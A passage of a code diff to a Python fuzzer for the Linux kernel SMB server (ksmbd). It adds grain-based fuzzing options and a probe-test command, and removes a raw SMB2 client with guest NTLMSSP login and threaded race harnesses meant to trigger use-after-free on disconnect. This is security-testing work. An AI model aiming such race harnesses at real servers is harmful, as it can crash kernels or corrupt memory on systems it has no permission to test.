+            '  ksmbdzzer.py fuzz  -r 1 --grain-max 15 --verbose   # quick smoke run (alias)\n'
+            '\n'
+            'a "grain" is one SMB2/SMB3 procedure harness; -t/--target restricts the run to a\n'
+            'subset for focused testing (default: all grains in libksmbdzzer.so).'))
+    gp.add_argument('-r', '--round', dest='round', type=int, default=1, metavar='N',
+                    help='Number of generations to run; each carries the strong grains forward '
+                         '(default: 1). This is the depth knob (round-based, not time-based).')
+    gp.add_argument('-procs', type=int, default=_default_procs(), metavar='N',
+                    help='Parallel grain workers (default: all CPUs). P3 combination needs >= 2.')
+    gp.add_argument('--grain-sat', dest='grain_sat', type=float, default=0.02, metavar='R',
+                    help='Per-grain coverage-saturation ratio: stop a grain when new-feature '
+                         'growth drops below R for a few windows (default: 0.02).')
+    gp.add_argument('--grain-max', dest='grain_max', type=int, default=60, metavar='S',
+                    help='Hard ceiling (seconds) per grain grain if it never saturates '
+                         '(default: 60). Lower = broader/shallower rounds.')
+    gp.add_argument('-t', '--target', dest='target', nargs='+', metavar='GRAIN', default=None,
+                    help='Run ONLY these grains (space-separated names, e.g. '
+                         '-t write copychunk reparse). Default: the whole fleet. '
+                         'For focused/targeted testing of specific procedures.')
+    gp.add_argument('--verbose', action='store_true',
+                    help='Extra per-grain diagnostics (i2s hits, kernel-PC counts).')
 
     args = parser.parse_args()
     if args.cmd == 'init': cmd_init(install_deps=args.install_deps)
-    elif args.cmd == 'fuzz': cmd_fuzz(args)
+    elif args.cmd in ('gfuzz', 'fuzz'): cmd_grain_fuzz(args)
     elif args.cmd == 'validate': cmd_validate(args)
-    elif args.cmd == 'campaign': cmd_campaign(args)
+    elif args.cmd == 'probe-test': cmd_probe_test()
     else: parser.print_help()
+
+
+def cmd_probe_test():
+    """Fast standalone check: bring up the worker lib, run the director once,
+    print the outcome and any reproducers. Used to validate the oracle without a
+    full fuzz campaign. Assumes `ksmbdzzer.py init` already configured ksmbd."""
+    print("=== probe-test: authenticate + run write-side contract oracle ===", flush=True)
+    lib = _get_lib()
+    if lib is None:
+        print("  [probe-test] lib init failed", flush=True); return
+    ok = run_dataflow_director(lib, _WORKER_OCTET)
+    print(f"  [probe-test] director ran: {'ok' if ok else 'NO-OP (see above)'}", flush=True)
+    if FINDINGS_DIR.exists():
+        found = sorted(FINDINGS_DIR.glob('*.json'))
+        print(f"  [probe-test] {len(found)} reproducer(s) in {FINDINGS_DIR}", flush=True)
+        for f in found:
+            print(f"      {f.name}", flush=True)
+    else:
+        print(f"  [probe-test] no findings dir ({FINDINGS_DIR})", flush=True)
 
 if __name__ == '__main__':
     main()
@@ -1635,177 +2010,6 @@ CMD_SET_INFO = 0x0011
 CMD_OPLOCK_BREAK = 0x0012
 
 
-def smb2_hdr(cmd, mid, tid=0, sid=0):
-    h = bytearray(64)
-    h[0:4] = b'\xfeSMB'
-    struct.pack_into('<H', h, 4, 64)
-    struct.pack_into('<H', h, 6, 1)
-    struct.pack_into('<H', h, 12, cmd)
-    struct.pack_into('<H', h, 14, 31)  # request more credits
-    struct.pack_into('<Q', h, 24, mid)
-    struct.pack_into('<I', h, 36, tid)
-    struct.pack_into('<Q', h, 40, sid)
-    return bytes(h)
-
-
-class RawSmb2:
-    """Single raw TCP SMB2 connection — no library, no serialization."""
-
-    def __init__(self, host='127.0.0.1', port=445):
-        self.host = host
-        self.port = port
-        self.sock = None
-        self.mid = 0
-        self.sid = 0
-        self.tid = 0
-        self.file_id = None
-        self.state = 'DISCONNECTED'
-
-    def connect(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.settimeout(3)
-        self.sock.connect((self.host, self.port))
-        self.state = 'CONNECTED'
-
-    def _send(self, pdu):
-        try:
-            self.sock.sendall(struct.pack('>I', len(pdu)) + pdu)
-        except: pass
-
-    def _recv(self):
-        try:
-            self.sock.settimeout(2)
-            hdr = b''
-            while len(hdr) < 4:
-                c = self.sock.recv(4 - len(hdr))
-                if not c: return None
-                hdr += c
-            rlen = struct.unpack('>I', hdr)[0]
-            if rlen > 1048576: return None
-            data = b''
-            while len(data) < rlen:
-                c = self.sock.recv(min(rlen - len(data), 65536))
-                if not c: break
-                data += c
-            return data
-        except: return None
-
-    def _xact(self, pdu):
-        self._send(pdu)
-        return self._recv()
-
-    def negotiate(self):
-        hdr = smb2_hdr(CMD_NEGOTIATE, self.mid); self.mid += 1
-        # StructSize=36, DialectCount=1, SecurityMode=1, Reserved=0
-        body = struct.pack('<HHHH', 36, 1, 1, 0)
-        body += struct.pack('<I', 0) + b'\x00' * 16  # Capabilities + ClientGuid
-        body += struct.pack('<IHH', 0, 0, 0)  # NegCtxOffset/Count/Reserved2
-        body += struct.pack('<H', 0x0300)  # Dialect: SMB 3.0
-        resp = self._xact(hdr + body)
-        if resp and len(resp) >= 64:
-            self.state = 'NEGOTIATED'
-        return resp
-
-    def session_setup_ntlmssp(self, user='fuzz', password='fuzz'):
-        """Minimal NTLMSSP negotiate + authenticate (may fail without proper auth)."""
-        # NTLMSSP Negotiate
-        ntlm_neg = (b'NTLMSSP\x00\x01\x00\x00\x00\x97\x82\x08\xe2'
-                    + b'\x00' * 16)
-        # SPNEGO wrap
-        ntlmssp_oid = b'\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'
-        spnego_oid = b'\x06\x06\x2b\x06\x01\x05\x05\x02'
-        mech_types = b'\xa0' + bytes([len(ntlmssp_oid) + 2]) + b'\x30' + bytes([len(ntlmssp_oid)]) + ntlmssp_oid
-        mech_token = b'\xa2' + bytes([len(ntlm_neg) + 2]) + b'\x04' + bytes([len(ntlm_neg)]) + ntlm_neg
-        neg_init = b'\xa0' + bytes([len(mech_types + mech_token) + 2]) + b'\x30' + bytes([len(mech_types + mech_token)]) + mech_types + mech_token
-        gss = b'\x60' + bytes([len(spnego_oid + neg_init)]) + spnego_oid + neg_init
-
-        hdr = smb2_hdr(CMD_SESSION_SETUP, self.mid); self.mid += 1
-        body = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
-        body += struct.pack('<HH', 88, len(gss)) + struct.pack('<Q', 0) + gss
-        resp = self._xact(hdr + body)
-        if resp and len(resp) >= 48:
-            self.sid = struct.unpack_from('<Q', resp, 40)[0]
-            self.state = 'SESSION'
-        return resp
-
-    def tree_connect(self, share='share'):
-        path = f'\\\\127.0.0.1\\{share}'.encode('utf-16-le')
-        hdr = smb2_hdr(CMD_TREE_CONNECT, self.mid, sid=self.sid); self.mid += 1
-        body = struct.pack('<HHHH', 9, 0, 72, len(path)) + path
-        resp = self._xact(hdr + body)
-        if resp and len(resp) >= 40:
-            self.tid = struct.unpack_from('<I', resp, 36)[0]
-            self.state = 'TREE'
-        return resp
-
-    def create(self, filename='fuzz', contexts=b''):
-        fname = filename.encode('utf-16-le')
-        hdr = smb2_hdr(CMD_CREATE, self.mid, self.tid, self.sid); self.mid += 1
-        body = struct.pack('<HBB', 57, 0, 0)
-        body += struct.pack('<I', 0) + struct.pack('<QQ', 0, 0)
-        body += struct.pack('<IIII', 0x12019F, 0x80, 0x07, 0x05)
-        body += struct.pack('<I', 0x40)
-        ctx_offset = 120 + len(fname)
-        ctx_offset = (ctx_offset + 7) & ~7
-        body += struct.pack('<HH', 120, len(fname))
-        body += struct.pack('<II', ctx_offset if contexts else 0, len(contexts))
-        body += fname
-        if contexts:
-            body += b'\x00' * (ctx_offset - 120 - len(fname))
-            body += contexts
-        resp = self._xact(hdr + body)
-        if resp and len(resp) >= 144:
-            self.file_id = resp[128:144]
-            self.state = 'FILE_OPEN'
-        return resp
-
-    def write(self, data, offset=0):
-        if not self.file_id: return None
-        hdr = smb2_hdr(CMD_WRITE, self.mid, self.tid, self.sid); self.mid += 1
-        body = struct.pack('<HHI', 49, 113, len(data))
-        body += struct.pack('<Q', offset) + self.file_id
-        body += struct.pack('<IIHHI', 0, 0, 0, 0, 0) + b'\x00' + data
-        return self._xact(hdr + body)
-
-    def set_info(self, info_type, info_class, buf, additional_info=0):
-        if not self.file_id: return None
-        hdr = smb2_hdr(CMD_SET_INFO, self.mid, self.tid, self.sid); self.mid += 1
-        body = struct.pack('<HBB', 33, info_type, info_class)
-        body += struct.pack('<I', len(buf)) + struct.pack('<HHI', 96, 0, additional_info)
-        body += self.file_id + buf
-        return self._xact(hdr + body)
-
-    def lock(self, offset=0, length=0xFFFF, flags=0x01):
-        if not self.file_id: return None
-        hdr = smb2_hdr(CMD_LOCK, self.mid, self.tid, self.sid); self.mid += 1
-        body = struct.pack('<HI', 48, 1) + self.file_id
-        body += struct.pack('<qqII', offset, length, flags, 0)
-        return self._xact(hdr + body)
-
-    def close(self):
-        if not self.file_id: return None
-        hdr = smb2_hdr(CMD_CLOSE, self.mid, self.tid, self.sid); self.mid += 1
-        body = struct.pack('<HHI', 24, 0, 0) + self.file_id
-        resp = self._xact(hdr + body)
-        self.file_id = None
-        self.state = 'TREE'
-        return resp
-
-    def send_raw(self, cmd, body):
-        """Send arbitrary command body — for fuzzing."""
-        hdr = smb2_hdr(cmd, self.mid, self.tid, self.sid); self.mid += 1
-        self._send(hdr + body)
-
-    def send_raw_recv(self, cmd, body):
-        hdr = smb2_hdr(cmd, self.mid, self.tid, self.sid); self.mid += 1
-        return self._xact(hdr + body)
-
-    def disconnect(self):
-        try: self.sock.close()
-        except: pass
-        self.state = 'DISCONNECTED'
-
-
 # ─── Stateful Grammar: Valid SMB State Transitions ────────────────────────────
 
 # Valid operations per state
@@ -1816,52 +2020,6 @@ STATE_OPS = {
     'SESSION': [CMD_TREE_CONNECT, CMD_LOGOFF],
 }
 
-
-def parallel_session_race(n_conns=4, target_file='fuzz_race'):
-    """True parallel: N raw TCP connections racing on same file.
-    No serialization — each socket operates independently."""
-    conns = []
-    for _ in range(n_conns):
-        c = RawSmb2()
-        c.connect()
-        c.negotiate()
-        c.session_setup_ntlmssp()
-        c.tree_connect()
-        c.create(target_file)
-        conns.append(c)
-
-    def worker(conn, ops):
-        for op in ops:
-            if op == 'write':
-                conn.write(os.urandom(4096), random.randint(0, 0xFFFF))
-            elif op == 'lock':
-                conn.lock(random.randint(0, 0xFFF), random.randint(1, 0xFFF))
-            elif op == 'unlock':
-                conn.lock(0, 0xFFF, flags=0x20)
-            elif op == 'close':
-                conn.close()
-            elif op == 'disconnect':
-                conn.disconnect()
-
-    # Generate random op sequences
-    ops_per_conn = []
-    for _ in range(n_conns):
-        ops = [random.choice(['write', 'write', 'lock', 'unlock', 'write'])
-               for _ in range(10)]
-        # Last connection gets disconnect (triggers oplock break UAF pattern)
-        ops_per_conn.append(ops)
-    ops_per_conn[-1].append('disconnect')
-
-    # Launch all in parallel — TRUE concurrency
-    threads = [threading.Thread(target=worker, args=(c, ops))
-               for c, ops in zip(conns, ops_per_conn)]
-    for t in threads: t.start()
-    for t in threads: t.join()
-
-    # Cleanup survivors
-    for c in conns:
-        try: c.disconnect()
-        except: pass
 
 # ─── Merged: sharp (boundary search + anomaly + trust boundary) ─────────────
 """
@@ -1876,445 +2034,38 @@ import struct, os, socket, threading, time
 from pathlib import Path
 
 
-class DfReader:
-    """Reads kcov_dataflow buffer and extracts (PC, ret_value) pairs."""
-    def __init__(self, df):
-        self.df = df
-
-    def get_ret_values(self):
-        """Returns list of (pc, ret_value) from last operation."""
-        self.df.disable()
-        words = self.df.read_words()
-        rets = []
-        pos = 0
-        while pos + 3 <= len(words):
-            hdr, pc, meta = words[pos], words[pos+1], words[pos+2]
-            nf = (hdr >> 24) & 0xF
-            if not nf: nf = 1
-            rt = (hdr >> 28) & 0xF
-            if rt == 0xF and pos + 3 < len(words):
-                val = words[pos + 3]
-                rets.append((pc, val))
-            pos += 3 + nf
-        return rets
-
-
 # ─── 1. Binary Search Boundaries ─────────────────────────────────────────────
-
-def binary_search_boundary(do_write_fn, field_name, low, high, df):
-    """Find exact value where ret transitions from 0 (success) to error.
-    do_write_fn(value) → performs write with that field value.
-    Returns (last_success, first_failure) boundary."""
-    # Verify low succeeds and high fails
-    df.enable()
-    do_write_fn(low)
-    rets_low = DfReader(df).get_ret_values()
-    has_success_low = any(v == 0 for _, v in rets_low)
-
-    df.enable()
-    do_write_fn(high)
-    rets_high = DfReader(df).get_ret_values()
-    has_success_high = any(v == 0 for _, v in rets_high)
-
-    if not has_success_low or has_success_high:
-        return None  # Can't binary search (both succeed or both fail)
-
-    # Binary search
-    while high - low > 1:
-        mid = (low + high) // 2
-        df.enable()
-        do_write_fn(mid)
-        rets = DfReader(df).get_ret_values()
-        if any(v == 0 for _, v in rets):
-            low = mid  # still succeeds
-        else:
-            high = mid  # fails
-    return (low, high)
-
-
-def run_boundary_search(fpath, df):
-    """Find boundaries for Length and Offset fields on CIFS-mounted write."""
-    results = {}
-
-    # Length boundary
-    def write_len(length):
-        try:
-            fd = os.open(fpath, os.O_WRONLY | os.O_CREAT, 0o666)
-            os.write(fd, b'X' * min(length, 65536))
-            os.close(fd)
-        except: pass
-
-    boundary = binary_search_boundary(write_len, 'Length', 1, 0x800000, df)
-    if boundary:
-        results['Length'] = boundary
-
-    # Offset boundary
-    def write_offset(offset):
-        try:
-            fd = os.open(fpath, os.O_WRONLY | os.O_CREAT, 0o666)
-            os.lseek(fd, offset, 0)
-            os.write(fd, b'X' * 64)
-            os.close(fd)
-        except: pass
-
-    boundary = binary_search_boundary(write_offset, 'Offset', 0, 0x7FFFFFFF, df)
-    if boundary:
-        results['Offset'] = boundary
-
-    return results
 
 
 # ─── 2. Two-Socket Race ──────────────────────────────────────────────────────
 
-def smb2_hdr(cmd, mid, tid=0, sid=0):
-    h = bytearray(64)
-    h[0:4] = b'\xfeSMB'
-    struct.pack_into('<H', h, 4, 64)
-    struct.pack_into('<H', h, 6, 1)
-    struct.pack_into('<H', h, 12, cmd)
-    struct.pack_into('<H', h, 14, 31)
-    struct.pack_into('<Q', h, 24, mid)
-    struct.pack_into('<I', h, 36, tid)
-    struct.pack_into('<Q', h, 40, sid)
-    return bytes(h)
-
-
-def _send_pdu(sock, pdu):
-    try:
-        sock.sendall(struct.pack('>I', len(pdu)) + pdu)
-    except: pass
-
-
-def _negotiate_auth(sock):
-    """Negotiate + session setup (guest) on a socket. Returns (sid, tid, mid)."""
-    mid = 0
-    # NEGOTIATE
-    body = struct.pack('<HHHH', 36, 1, 1, 0) + struct.pack('<I', 0) + b'\x00'*16
-    body += struct.pack('<IHH', 0, 0, 0) + struct.pack('<H', 0x0300)
-    pdu = smb2_hdr(0, mid) + body; mid += 1
-    _send_pdu(sock, pdu)
-    sock.recv(4096)
-
-    # SESSION_SETUP 1
-    ntlm = b'NTLMSSP\x00\x01\x00\x00\x00\x97\x82\x08\xe2' + b'\x00'*16
-    hdr = smb2_hdr(1, mid); mid += 1
-    body = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
-    body += struct.pack('<HH', 88, len(ntlm)) + struct.pack('<Q', 0) + ntlm
-    _send_pdu(sock, hdr + body)
-    resp = sock.recv(4096)
-    sid = struct.unpack_from('<Q', resp, 4+40)[0] if len(resp) > 48 else 0
-
-    # SESSION_SETUP 2 (guest user)
-    auth = bytearray(128)
-    auth[0:12] = b'NTLMSSP\x00\x03\x00\x00\x00'
-    struct.pack_into('<I', auth, 60, 0xe2088215)
-    off = 72
-    struct.pack_into('<HHI', auth, 12, 24, 24, off); off += 24
-    struct.pack_into('<HHI', auth, 20, 24, 24, off); off += 24
-    struct.pack_into('<HHI', auth, 28, 0, 0, off)
-    user = b'g\x00u\x00e\x00s\x00t\x00'
-    struct.pack_into('<HHI', auth, 36, len(user), len(user), off)
-    auth[off:off+len(user)] = user; off += len(user)
-    struct.pack_into('<HHI', auth, 44, 0, 0, off)
-    struct.pack_into('<HHI', auth, 52, 0, 0, off)
-
-    hdr = smb2_hdr(1, mid, sid=sid); mid += 1
-    body = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
-    body += struct.pack('<HH', 88, off) + struct.pack('<Q', 0) + bytes(auth[:off])
-    _send_pdu(sock, hdr + body)
-    resp = sock.recv(4096)
-    if len(resp) > 48:
-        sid = struct.unpack_from('<Q', resp, 4+40)[0]
-
-    # TREE_CONNECT
-    path = '\\\\127.0.0.1\\share'.encode('utf-16-le')
-    hdr = smb2_hdr(3, mid, sid=sid); mid += 1
-    body = struct.pack('<HHHH', 9, 0, 72, len(path)) + path
-    _send_pdu(sock, hdr + body)
-    resp = sock.recv(4096)
-    tid = struct.unpack_from('<I', resp, 4+36)[0] if len(resp) > 44 else 0
-
-    return sid, tid, mid
-
-
-def two_socket_race(df, n_rounds=20):
-    """Socket A writes continuously. Socket B disconnects mid-write.
-    Targets UAF when fp->conn is accessed after disconnect."""
-    bugs_found = 0
-
-    for _ in range(n_rounds):
-        try:
-            # Socket A: connect + auth + create
-            sa = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sa.settimeout(2)
-            sa.connect(('127.0.0.1', 445))
-            sid_a, tid_a, mid_a = _negotiate_auth(sa)
-
-            # Socket B: connect + auth + open SAME file
-            sb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sb.settimeout(2)
-            sb.connect(('127.0.0.1', 445))
-            sid_b, tid_b, mid_b = _negotiate_auth(sb)
-
-            # Both CREATE same file
-            fname = b'r\x00a\x00c\x00e\x00'
-            for s, sid, tid, mid in [(sa, sid_a, tid_a, mid_a), (sb, sid_b, tid_b, mid_b)]:
-                hdr = smb2_hdr(5, mid, tid, sid)
-                body = struct.pack('<HBB', 57, 0, 0) + struct.pack('<I', 0)
-                body += struct.pack('<QQ', 0, 0) + struct.pack('<IIII', 0x12019F, 0x80, 0x07, 0x05)
-                body += struct.pack('<I', 0x40) + struct.pack('<HH', 120, len(fname))
-                body += struct.pack('<II', 0, 0) + fname
-                _send_pdu(s, hdr + body)
-                s.recv(4096)
-
-            # Race: A writes repeatedly, B disconnects mid-write
-            df.enable()
-            write_data = os.urandom(4096)
-
-            def writer():
-                for i in range(10):
-                    hdr = smb2_hdr(9, mid_a + i, tid_a, sid_a)
-                    body = struct.pack('<HH', 49, 112) + struct.pack('<I', len(write_data))
-                    body += struct.pack('<Q', i * 4096)
-                    body += b'\x00' * 16  # file_id (invalid but triggers lookup)
-                    body += struct.pack('<IIHHI', 0, 0, 0, 0, 0) + b'\x00' + write_data
-                    _send_pdu(sa, hdr + body)
-                    time.sleep(0.001)
-
-            def disconnector():
-                time.sleep(0.005)  # disconnect mid-write
-                sb.close()
-
-            t1 = threading.Thread(target=writer)
-            t2 = threading.Thread(target=disconnector)
-            t1.start(); t2.start()
-            t1.join(); t2.join()
-            df.disable()
-
-            try: sa.close()
-            except: pass
-        except Exception:
-            pass
-
-    return bugs_found
-
 
 # ─── 3. Anomaly Detection ────────────────────────────────────────────────────
 
-class AnomalyDetector:
-    """Tracks (PC, max_successful_value). Flags when ret=0 for value > 2× max."""
-
-    def __init__(self):
-        self.max_success = {}  # pc → max value that returned 0
-        self.anomalies = []
-
-    def check(self, rets, context=''):
-        """Check ret values for anomalies. rets = [(pc, ret_value), ...]"""
-        for pc, val in rets:
-            if val == 0:
-                # Success — but is it anomalous?
-                prev_max = self.max_success.get(pc, 0)
-                if prev_max > 0 and val == 0:
-                    # This is a "normal success" — track the context value
-                    pass
-            # We need the ARGUMENT that caused ret=0, not the ret itself
-            # This requires correlating entry records with return records
-
-    def check_with_args(self, entries, returns):
-        """entries = [(pc, arg_value)], returns = [(pc, ret_value)]
-        Flag when arg_value that gets ret=0 is > 2× previous max for that PC."""
-        for pc, ret_val in returns:
-            if ret_val != 0:
-                continue
-            # Find corresponding entry with same PC
-            for epc, arg_val in entries:
-                if epc == pc and arg_val > 0:
-                    prev_max = self.max_success.get(pc, 0)
-                    if prev_max > 0 and arg_val > prev_max * 2:
-                        self.anomalies.append({
-                            'pc': pc, 'arg': arg_val,
-                            'prev_max': prev_max, 'ratio': arg_val / prev_max
-                        })
-                    self.max_success[pc] = max(prev_max, arg_val)
-                    break
-
-    def report(self):
-        if self.anomalies:
-            print(f"  [!] {len(self.anomalies)} anomalies: ret=0 for values > 2× previous max")
-            for a in self.anomalies[:5]:
-                print(f"      PC=0x{a['pc']:x} arg=0x{a['arg']:x} (prev_max=0x{a['prev_max']:x}, {a['ratio']:.1f}×)")
-        return self.anomalies
-
 
 # ─── 4. Stateful Sequence Learning ───────────────────────────────────────────
-
-class SequenceLearner:
-    """Tracks which operation sequences reach the deepest PCs.
-    Replays best sequences with mutations."""
-
-    def __init__(self):
-        self.sequences = []  # [(depth_score, ops_list)]
-        self.best_ops = []
-
-    def record(self, ops, pcs_reached):
-        """Record a sequence and how deep it went."""
-        # Depth = number of unique PCs in ksmbd range
-        ksmbd_pcs = [pc for pc in pcs_reached if 0xffffffff80000000 <= pc <= 0xffffffffffffffff]
-        depth = len(set(ksmbd_pcs))
-        self.sequences.append((depth, ops[:]))
-        self.sequences.sort(key=lambda x: -x[0])
-        self.sequences = self.sequences[:32]  # keep top 32
-        if self.sequences:
-            self.best_ops = self.sequences[0][1]
-
-    def get_mutations(self, n=5):
-        """Return mutated versions of the best sequence."""
-        if not self.best_ops:
-            return []
-        import random
-        mutations = []
-        for _ in range(n):
-            ops = self.best_ops[:]
-            # Mutate: swap two ops, duplicate one, or change a value
-            mut_type = random.randint(0, 3)
-            if mut_type == 0 and len(ops) > 1:
-                i, j = random.sample(range(len(ops)), 2)
-                ops[i], ops[j] = ops[j], ops[i]
-            elif mut_type == 1 and ops:
-                ops.append(random.choice(ops))
-            elif mut_type == 2 and ops:
-                idx = random.randint(0, len(ops) - 1)
-                op = list(ops[idx])
-                if len(op) > 1 and isinstance(op[1], int):
-                    op[1] ^= random.randint(1, 0xFF)
-                ops[idx] = tuple(op)
-            elif mut_type == 3 and len(ops) > 1:
-                ops.pop(random.randint(0, len(ops) - 1))
-            mutations.append(ops)
-        return mutations
-
-    def report(self):
-        if self.sequences:
-            best_depth = self.sequences[0][0]
-            print(f"  [seq] Best depth: {best_depth} PCs, {len(self.sequences)} sequences tracked")
 
 
 # ─── Public API ───────────────────────────────────────────────────────────────
 
 # Persistent state across rounds
-_anomaly_detector = AnomalyDetector()
-_sequence_learner = SequenceLearner()
-
-
-def run_sharp_analysis(df, fpath, shared_vpool, all_features):
-    """Run all sharp analysis. Called per-round after snipers."""
-    results = {}
-
-    # 1. Binary search boundaries
-    boundaries = run_boundary_search(fpath, df)
-    if boundaries:
-        results['boundaries'] = boundaries
-        for field, (lo, hi) in boundaries.items():
-            print(f"  [boundary] {field}: success={lo} → fail={hi}")
-            # Add boundary values to pool
-            for v in [lo, hi, lo-1, hi+1, lo//2, hi*2]:
-                if 0 < v < 0x100000000:
-                    try: shared_vpool.append(v)
-                    except: pass
-
-    # 2. Two-socket race
-    two_socket_race(df, n_rounds=10)
-
-    # 3. Anomaly report
-    _anomaly_detector.report()
-
-    # 4. Sequence learning report
-    _sequence_learner.report()
-
-    return results
-
-
-def record_operation(ops, pcs):
-    """Called from worker to record operation sequence + PCs reached."""
-    _sequence_learner.record(ops, pcs)
-
-
-def check_anomaly(entries, returns):
-    """Called from worker to check for anomalous ret=0."""
-    _anomaly_detector.check_with_args(entries, returns)
 
 
 # ─── 5. Logic Bug Detection (Trust Boundary Analysis) ─────────────────────────
 
-class TrustBoundaryChecker:
-    """Detects logic bugs where operations succeed that shouldn't.
-    
-    Patterns detected:
-    1. Permission bypass: WRITE succeeds after DENY ACE set
-    2. State confusion: operation succeeds after file CLOSED
-    3. Unexpected success: ret=0 for operation that previously always failed
-    4. Lock bypass: WRITE succeeds at locked offset from another session
-    """
 
-    def __init__(self):
-        self.op_history = []  # [(op_name, offset, result)]
-        self.denied_ranges = []  # [(offset, length)] where DENY was set
-        self.closed_fids = set()
-        self.locked_ranges = []  # [(offset, length, session_id)]
-        self.findings = []
-
-    def record_op(self, op_name, offset, length, result, fid=None, session_id=None):
-        """Record an operation and check for logic bugs."""
-        self.op_history.append((op_name, offset, result))
-
-        # Check 1: WRITE succeeds at denied range
-        if op_name == 'WRITE' and result == 0:
-            for d_off, d_len in self.denied_ranges:
-                if offset >= d_off and offset < d_off + d_len:
-                    self.findings.append({
-                        'type': 'PERMISSION_BYPASS',
-                        'detail': f'WRITE succeeded at offset {offset} which has DENY ACE',
-                        'severity': 'CRITICAL'
-                    })
-
-        # Check 2: Operation succeeds on closed file
-        if fid and fid in self.closed_fids and result == 0:
-            self.findings.append({
-                'type': 'USE_AFTER_CLOSE',
-                'detail': f'{op_name} succeeded on closed fid={fid.hex()[:8]}',
-                'severity': 'CRITICAL'
-            })
-
-        # Check 3: WRITE succeeds at locked range from different session
-        if op_name == 'WRITE' and result == 0 and session_id:
-            for l_off, l_len, l_sid in self.locked_ranges:
-                if l_sid != session_id and offset >= l_off and offset < l_off + l_len:
-                    self.findings.append({
-                        'type': 'LOCK_BYPASS',
-                        'detail': f'WRITE at {offset} bypassed lock held by session {l_sid}',
-                        'severity': 'HIGH'
-                    })
-
-    def record_deny(self, offset, length):
-        self.denied_ranges.append((offset, length))
-
-    def record_close(self, fid):
-        if fid: self.closed_fids.add(fid)
-
-    def record_lock(self, offset, length, session_id):
-        self.locked_ranges.append((offset, length, session_id))
-
-    def report(self):
-        if self.findings:
-            print(f"  [!] LOGIC BUGS: {len(self.findings)} trust boundary violations!")
-            for f in self.findings[:5]:
-                print(f"      [{f['severity']}] {f['type']}: {f['detail']}")
-        return self.findings
+# ─── 6. Active Data-Flow Guided Mutation Engine ──────────────────────────────
 
 
-_trust_checker = TrustBoundaryChecker()
+# ─── 7. Compound Chain Request Generator ─────────────────────────────────────
 
 
-def check_trust_boundary(op_name, offset, length, result, fid=None, session_id=None):
-    """Called from worker after each operation to check for logic bugs."""
-    _trust_checker.record_op(op_name, offset, length, result, fid, session_id)
+# ─── 8. Cross-Session File ID Replay Attack ───────────────────────────────────
+
+
+# ─── 9. CHANGE_NOTIFY Async Cancel Fuzzer ─────────────────────────────────────
+
+
+# ─── 10. Durable Handle V2 Reconnect Fuzzer ──────────────────────────────────
+
+
